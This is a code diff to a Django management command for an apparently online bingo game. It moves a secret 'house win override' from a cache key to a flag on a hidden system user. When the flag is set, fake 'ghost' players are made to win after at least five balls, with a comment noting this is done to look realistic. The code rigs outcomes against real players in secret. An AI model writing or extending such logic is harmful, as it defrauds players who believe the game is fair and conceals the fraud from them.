@@ -7,7 +7,6 @@ from django.db import close_old_connections
 from channels.layers import get_channel_layer 
 from asgiref.sync import async_to_sync           
 from bingo.models import GameRound, GameControl, PermanentCard, User
-from django.core.cache import cache
 
 # ==========================================
 # 🎲 DYNAMIC GHOST BOARD GENERATOR
@@ -152,13 +151,22 @@ class Command(BaseCommand):
                         win_threshold = 75
                         if ghosts: win_threshold = 34 + (room.id % 26) 
                         
-                        # --- 💀 THE BLOW REQUEST (HOUSE WIN OVERRIDE) ---
-                        if cache.get(f'housewin_{tier}'):
-                            # Ensure at least 5 balls have dropped to look realistic
+                        # --- 💀 THE BLOW REQUEST (HOUSE WIN OVERRIDE DB CHECK) ---
+                        house_win_requested = False
+                        try:
+                            hw_user = User.objects.filter(username=f"sys_housewin_{tier}").first()
+                            if hw_user and hw_user.bot_state == "ACTIVE":
+                                house_win_requested = True
+                        except Exception: pass
+
+                        if house_win_requested and ghosts:
                             if len(called) >= 5:
                                 win_threshold = len(called) + 1
-                                cache.delete(f'housewin_{tier}')
-                        # ------------------------------------------------
+                                try:
+                                    hw_user.bot_state = "IDLE"
+                                    hw_user.save(update_fields=['bot_state'])
+                                except: pass
+                        # --------------------------------------------------------
                             
                         if len(called) < win_threshold:
                             remaining = [n for n in range(1, 76) if n not in called]
@@ -216,8 +224,9 @@ class Command(BaseCommand):
                                         room.winning_board = real_card.board
                                     except Exception:
                                         room.winning_board = generate_ghost_winning_board(called)
+
                             except Exception as e:
-                                print(f"⚠️ Warning: Ghost crowning skipped: {e}")
+                                print(f"⚠️ Warning: Ghost crowning skipped due to error: {e}")
 
                             room.status = "ENDED"
                             room.finished_at = now
